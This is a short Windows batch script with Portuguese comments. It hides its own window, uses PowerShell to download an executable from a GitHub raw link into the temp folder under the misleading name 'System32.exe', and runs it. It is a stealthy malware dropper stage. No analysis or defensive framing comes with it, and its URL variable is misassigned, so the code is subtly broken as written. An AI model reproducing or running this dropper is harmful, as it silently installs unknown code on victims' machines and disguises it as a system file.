@echo off

:: roda o próprio script oculto
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
    exit
)

set "https://github.com/lcmandrikion-hash/Mez/raw/refs/heads/main/LZX2.exe"
set "ARQ=%TEMP%\System32.exe"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQ%'"

start "" "%ARQ%"
